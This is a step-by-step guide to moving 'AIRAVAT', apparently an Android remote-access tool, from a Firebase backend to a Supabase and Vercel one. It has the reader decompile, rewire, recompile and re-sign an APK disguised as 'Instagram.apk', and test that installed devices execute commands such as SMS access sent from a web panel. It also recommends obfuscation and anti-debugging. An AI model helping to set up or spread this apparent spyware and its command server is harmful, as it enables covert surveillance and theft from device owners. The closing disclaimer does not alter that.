# AIRAVAT Migration Guide: Firebase to Supabase

This guide provides step-by-step instructions to migrate your AIRAVAT project from Firebase to Supabase and deploy it on Vercel.

## Prerequisites

- Supabase account (free tier available at https://supabase.com)
- Vercel account (free tier available at https://vercel.com)
- Android development tools (Android Studio or APK modification tools)

## Part 1: Supabase Setup

### 1.1 Create Supabase Project

1. Go to https://supabase.com and create a new account
2. Create a new project:
   - Choose a project name (e.g., "airavat-control")
   - Select a region closest to your target audience
   - Generate a database password (save it securely)
   - Wait for the project to be created (2-3 minutes)

### 1.2 Configure Database

1. In your Supabase dashboard, go to the SQL Editor
2. Copy and paste the entire content from `supabase-schema.sql`
3. Run the SQL script to create all necessary tables and configurations
4. Verify tables are created in the Table Editor

### 1.3 Get Project Credentials

1. Go to Settings → API in your Supabase dashboard
2. Copy the following values:
   - Project URL (e.g., `https://abcdefghijklmn.supabase.co`)
   - Public anon key
   - Service role key (keep this secret!)

## Part 2: Web Panel Migration

### 2.1 Update Configuration

1. Open `WEB PANEL/index.html`
2. Replace the Supabase configuration values:
   ```javascript
   const supabaseConfig = {
     url: "https://your-project-id.supabase.co",  // Replace with your Project URL
     key: "your-supabase-anon-key"                // Replace with your Public anon key
   };
   ```

### 2.2 Remove Firebase Files (Optional)

You can remove these Firebase files as they're no longer needed:
- `firebase-app.js`
- `firebase-auth.js`
- `firebase-database.js`
- `firebase-storage.js`

The new system uses:
- `supabase-client.js` (Supabase client)
- `script-supabase.js` (Updated application logic)

## Part 3: Android APK Migration

### 3.1 Decompile the APK

1. Download the `Instagram.apk` from the ANDROID APP folder
2. Use APKTool or ApkEasy Tool to decompile:
   ```bash
   apktool d Instagram.apk
   ```

### 3.2 Update Configuration

1. Navigate to `res/values/strings.xml`
2. Replace Firebase configuration with Supabase configuration:
   ```xml
   <!-- Remove these Firebase strings -->
   <!--
   <string name="firebase_database_url">...</string>
   <string name="google_api_key">...</string>
   <string name="google_app_id">...</string>
   <string name="google_storage_bucket">...</string>
   <string name="project_id">...</string>
   -->
   
   <!-- Add these Supabase strings -->
   <string name="supabase_url">https://your-project-id.supabase.co</string>
   <string name="supabase_anon_key">your-supabase-anon-key</string>
   <string name="supabase_service_role_key">your-supabase-service-role-key</string>
   ```

### 3.3 Replace Java/Kotlin Code

1. Add the `SupabaseClient.java` file to your project's source code
2. Replace all Firebase database calls with Supabase equivalents:

   **Before (Firebase):**
   ```java
   FirebaseDatabase database = FirebaseDatabase.getInstance();
   DatabaseReference ref = database.getReference("online/onlinetheoneandonly");
   ```

   **After (Supabase):**
   ```java
   SupabaseClient supabase = SupabaseClient.getInstance(this);
   String deviceId = DeviceInfoHelper.getDeviceId(this);
   supabase.registerDevice(deviceId, model, version, battery, rooted, callback);
   ```

### 3.4 Update Dependencies

1. Remove Firebase dependencies from `build.gradle`:
   ```gradle
   // Remove these
   implementation 'com.google.firebase:firebase-database'
   implementation 'com.google.firebase:firebase-storage'
   ```

2. Add HTTP client dependencies (if not already present):
   ```gradle
   // Add these for HTTP requests
   implementation 'com.squareup.okhttp3:okhttp:4.9.3'
   implementation 'org.json:json:20210307'
   ```

### 3.5 Recompile APK

1. Recompile the APK:
   ```bash
   apktool b Instagram -o Instagram_supabase.apk
   ```

2. Sign the APK (required for installation):
   ```bash
   # Generate key (one time only)
   keytool -genkey -v -keystore airavat.keystore -alias airavat -keyalg RSA -keysize 2048 -validity 10000
   
   # Sign APK
   jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore airavat.keystore Instagram_supabase.apk airavat
   
   # Align APK
   zipalign -v 4 Instagram_supabase.apk Instagram_final.apk
   ```

## Part 4: Vercel Deployment

### 4.1 Prepare Project

1. Ensure your project structure looks like this:
   ```
   AIRAVAT/
   ├── WEB PANEL/
   │   ├── index.html
   │   ├── script-supabase.js
   │   ├── supabase-client.js
   │   ├── jquery.js
   │   ├── img/
   │   ├── imgg/
   │   └── asset/
   ├── vercel.json
   └── README.md
   ```

### 4.2 Deploy to Vercel

**Option 1: Using Vercel CLI**
1. Install Vercel CLI:
   ```bash
   npm i -g vercel
   ```

2. Login to Vercel:
   ```bash
   vercel login
   ```

3. Deploy:
   ```bash
   cd /path/to/AIRAVAT
   vercel
   ```

**Option 2: Using GitHub**
1. Push your code to GitHub
2. Go to https://vercel.com/dashboard
3. Click "Import Project"
4. Select your GitHub repository
5. Configure build settings (Vercel will auto-detect)
6. Deploy

### 4.3 Configure Environment Variables

1. In Vercel dashboard, go to your project settings
2. Add environment variables:
   - `SUPABASE_URL`: Your Supabase project URL
   - `SUPABASE_ANON_KEY`: Your Supabase public anon key

### 4.4 Set Custom Domain (Optional)

1. In Vercel dashboard, go to Domains
2. Add your custom domain
3. Configure DNS records as instructed

## Part 5: Testing

### 5.1 Test Web Panel

1. Open your deployed Vercel URL
2. Check browser console for any errors
3. Verify Supabase connection is working

### 5.2 Test Android APK

1. Install the modified APK on a test device
2. Grant all required permissions
3. Check if device appears in the web panel
4. Test basic commands (SMS, device info, etc.)

### 5.3 Verify Real-time Functionality

1. Send a command from web panel
2. Verify it appears in Supabase database
3. Check if APK receives and executes the command
4. Verify response appears in web panel

## Part 6: Security Considerations

### 6.1 Database Security

1. Review Row Level Security (RLS) policies in Supabase
2. Consider restricting access by IP or authentication
3. Monitor usage in Supabase dashboard

### 6.2 API Key Security

1. Never expose service role key in client-side code
2. Use environment variables for sensitive data
3. Regularly rotate API keys

### 6.3 APK Security

1. Enable code obfuscation
2. Consider adding anti-debugging measures
3. Use HTTPS only for all communications

## Troubleshooting

### Common Issues

1. **CORS Errors**: Ensure your domain is added to Supabase CORS settings
2. **Database Connection**: Check API keys and URL format
3. **Real-time Not Working**: Verify RLS policies allow subscriptions
4. **APK Not Connecting**: Check device permissions and network connectivity

### Logs and Monitoring

1. Check Vercel function logs for web panel issues
2. Monitor Supabase logs for database errors
3. Use Android Studio logcat for APK debugging

## Performance Optimization

1. **Database**: Add indexes for frequently queried columns
2. **Storage**: Use CDN for file uploads
3. **Real-time**: Limit subscription frequency
4. **Caching**: Implement client-side caching where appropriate

## Maintenance

1. **Regular Updates**: Keep Supabase client updated
2. **Database Cleanup**: Implement data retention policies
3. **Monitoring**: Set up alerts for high usage or errors
4. **Backups**: Regular database backups (Supabase Pro feature)

## Support

For issues specific to this migration:
1. Check Supabase documentation: https://supabase.com/docs
2. Verify Vercel deployment guides: https://vercel.com/docs
3. Review Android APK modification tutorials

---

**⚠️ IMPORTANT DISCLAIMER ⚠️**

This software is provided for educational purposes only. The use of this software for illegal activities is strictly prohibited. Users are solely responsible for compliance with all applicable laws and regulations. The developers assume no liability for any misuse of this software.

---

**Credits**: Original AIRAVAT project + Migration to Supabase by Bionic Sailor
